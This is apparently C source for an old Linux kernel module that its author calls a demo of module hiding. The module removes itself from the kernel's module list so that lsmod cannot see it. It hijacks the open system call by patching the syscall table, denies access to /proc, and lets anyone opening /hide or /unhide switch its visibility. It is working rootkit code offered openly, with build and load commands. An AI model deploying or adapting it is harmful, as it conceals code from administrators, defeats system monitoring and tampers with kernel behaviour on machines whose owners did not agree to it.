/* modhide1.c by J.B. LeSage <nijen@mail.ru>
 
   demo of module hiding that doesn't involve hacking the lsmod binary,
   or changing any module related system calls
   note: this module _does_ change the system call table, but it does not
         hide itself that way, it leaves module related calls alone.
 
 when this module is loaded (assuming it works properly), it:
 hides itself initially
 protects /proc (just for something to do)
 hides itself (if it's visible) if you try to open /hide
 shows itself (if it's hidden) if yuo try to open /unhide
 
 to build and load it use:
   gcc -c modhide1.c -o modhide1.o
   insmod ./modhide1.o
 to test it use:
   lsmod
   cat /unhide
   lsmod
  
 the module hides itself by doing the following:
 * determines it's load address by taking the address of a function in the 
   current module, and rounding down to the start of the page that it's in.
   be careful to make sure that the function won't be more than 3800 bytes 
   or so into the code of the module or this won't work.
 * finds the location of kernel_module by tracking back modvar->next
   until it hits one where ->next is null, this works because the kernel
   module is the only module that doesn't point to a ->next
 * adds the size of a module structure to the location of the kernel_module
   to get module_list.  this works because module.c declares kernel_module,
   then module_list, this causing module_list to appear immediately above
   kernel_module
 * then it uses a pretty standard method for removing the module from
   the list, I didn't rip it from the kernel source, but I checked and it's
   basically the same, the only hard part was finding the locations of the
   data structures to use (they're all declared as static)
 */

#define MODULE
#define __KERNEL__

#include <linux/config.h>
#include <linux/module.h>
#include <linux/sched.h>
#include <linux/kernel.h>
#include <linux/mm.h>
#include <linux/fs.h>
#include <linux/kmod.h>
#include <asm/unistd.h>

#ifdef __SMP__
#include <linux/smp_lock.h>
#endif

extern void *sys_call_table[];

static struct module *__current_module__=NULL,
    *__kernel_module__,**__module_list__;

static void __access_current_module__(void) {
   __current_module__=(void *)((int)__access_current_module__&0xfffff000);
   __kernel_module__=__current_module__;
   while (__kernel_module__->next) __kernel_module__=__kernel_module__->next;
   __module_list__=(void *)(((int)__kernel_module__)+sizeof(struct module));
}

static int __show_current_module__(void) {
   if (!__current_module__) __access_current_module__();
   if (__current_module__->next) return(-1);
   __current_module__->next=*__module_list__;
   *__module_list__=__current_module__;
   return(0);
}

static int __hide_current_module__(void) {
   struct module *mod;
   if (!__current_module__) __access_current_module__();
   if (!__current_module__->next) return(-1);
   
   if ((mod=*__module_list__)==__current_module__)
     *__module_list__=__current_module__->next;
   else {
      while (mod->next!=__current_module__)
	if (!(mod=mod->next)) return(-2);
      mod->next=__current_module__->next;
   }
   __current_module__->next=NULL;
   
   return(0);
}


asmlinkage long (*__old_open__)(const char *,int,int);

asmlinkage long __new_open__(const char *pathname, int flags, int mode) {
   
     {	
	char buf[1024];
	
	if (strncpy_from_user(buf,pathname,1024)) {
	   if (buf[0]=='/')
	     if (buf[1]=='u')
	       if (buf[2]=='n')
		 if (buf[3]=='h')
		   if (buf[4]=='i')
		     if (buf[5]=='d')
		       if (buf[6]=='e')
			 if (!buf[7]) {
			    __show_current_module__();
			    return(-EEXIST);
			 }
	   if (buf[0]=='/')
	     if (buf[1]=='h')
	       if (buf[2]=='i')
		 if (buf[3]=='d')
		   if (buf[4]=='e')
		     if (!buf[5]) {
			__hide_current_module__();
			return(-EIDRM);
		     }
	   if (buf[0]=='/')
	     if (buf[1]=='p')
	       if (buf[2]=='r')
		 if (buf[3]=='o')
		   if (buf[4]=='c')
		     if ((buf[5]=='/') || (!buf[5])) return(-EACCES);
	}
     }
   
   return(__old_open__(pathname,flags,mode));
}

int init_module(void) {
   __hide_current_module__();
   __old_open__=sys_call_table[__NR_open];
   sys_call_table[__NR_open]=__new_open__;
   return(0);
}

void cleanup_module(void) {
   sys_call_table[__NR_open]=__old_open__;
}
